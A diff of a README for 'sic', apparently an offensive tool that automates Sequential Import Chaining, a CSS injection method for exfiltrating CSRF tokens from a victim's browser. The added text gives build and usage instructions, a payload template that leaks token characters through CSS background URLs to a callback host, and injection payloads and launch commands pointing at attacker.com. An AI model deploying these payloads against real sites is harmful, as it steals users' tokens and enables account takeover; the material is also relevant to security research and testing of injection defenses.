@@ -4,7 +4,10 @@ Typical CSS injection requires an attacker to load the context a number of times
 
 Sequential import chaining is a technique that enable a quicker, easier, token exfiltration even in the cases where framing isn't possible or the dynamic context is only occasionally realized.
 
-## Prerequisites
+### Blog Post
+I wrote a blog post on this. Read about it [here!](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)
+
+## Prerequisites for Attack
 
 This attack only works if the attacker at least one of these: 
 
@@ -13,7 +16,69 @@ This attack only works if the attacker at least one of these:
 
 The first case is probably more likely and will work even if filtered through vanilla DOM Purify.
 
-## Technique
+## Building
+
+1. Install RustUp (https://rustup.rs/ - `curl https://sh.rustup.rs -sSf | sh`)
+2. Install the nightly (`rustup install nightly`)
+3. Default to nightly (`rustup default nightly`)
+4. Build with cargo (`cargo build --release`)
+
+You will find the built binary at `./target/release/sic`
+
+## Usage
+`sic` has documentation on the available flags when calling `sic -h` but the following is information for general usage.
+
+* `-p` will set the lower port that `sic` will operate on. By default this is 3000. `sic` will also listen on port `port + 1` (by default 3001) to circumvent a technical limitation in most browsers regarding open connection limits.
+* `--ph` sets the hostname that the "polling host" will operate on. This can either be the lower or higher operating port, though it's traditionally the lower port. Defaults to `http://localhost:3000`. This _must_ be different than `--ch`
+* `--ch` similar to `--ph` but this sets the "callback host" where tokens are sent. Defaults to `http://localhost:3001`. This _must_ be different than `--ph`.
+* `-t` specifies the template file used to generate the token exfiltration payloads.
+* `--charset` specifies the set of characters that may exist in the target token. Defaults to alphanumerics (`abc...890`).
+
+A standard usage of this tool may look like the following:
+```
+./sic -p 3000 --ph "http://localhost:3000" --ch "http://localhost:3001" -t my_template_file
+```
+
+And the HTML injection payload you might use would look like:
+```
+<style>@import url(http://localhost:3000/staging?len=32);</style>
+```
+
+The `len` parameter specifies how long the token is. This is necessary for `sic` to generate the appropriate number of `/polling` responses. If unknown, it's safe to use a value higher than the total number of chars in the token.
+
+### Advanced Logs
+`sic` will print minimal logs whenever it receives any token information; however, if you want more detailed information advanced logging is supported through an environment variable `RUST_LOG`.
+
+```
+RUST_LOG=info ./sic -t my_template_file
+```
+
+### Templates
+The templating system is very straightforward for `sic`. There are two actual templates (probably better understood as 'placeholders'):
+* `{{:token:}}` - This is the current token that we're attempting to test for. This would be the `xyz` in `input[name=csrf][value^=xyz]{...}`
+* `{{:callback:}}` - This is the address that you want the browser to reach out to when a token is determined. This will be the callback host (`--ch`). All the information `sic` needs to understand what happened client-side will be in this url.
+
+An example template file might look like this:
+```
+input[name=csrf][value^={{:token:}}] { background: url({{:callback:}}); }
+```
+
+`sic` will automatically generate all of the payloads required for your attack and make sure it's pointing to the right callback urls.
+
+### HTTPS
+I didn't bake official HTTPS support into the tool but made it possible to potentially use nginx as a reverse proxy. I haven't validated that this will work or not, but I don't really see a reason why it wouldn't. 
+
+Assuming you have configured nginx to forward port 3000 -> 4000 and 3001 -> 4001 then you might launch the tool as follows:
+
+```
+./sic -p 4000 --ph "https://attacker.com:3000" --ch "https://attacker.com:3001" -t my_template_file
+```
+
+Note that the ports on `--ph` and `--ch` match up with the ports nginx is serving and not `sic`. 
+
+## Technique Description
+
+For a better story and additional information, please see my blog post on [Sequential Import Chaining here](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b).
 
 The idea behind CSS injection token exfiltration is simple: You need the browser to evaluate your malicious css once, send an outbound request with the next learned token, and repeat. 
 
@@ -32,7 +97,7 @@ Sequential Import Chaining uses 3 easy steps to trick some browser into performi
 Here's an example of what these might look like:
 
 ### Payload
-`<style>@import url(http://attacker.com/staging);</style>`
+`<style>@import url(http://attacker.com/staging?len=32);</style>`
 
 ### Staging
 ```
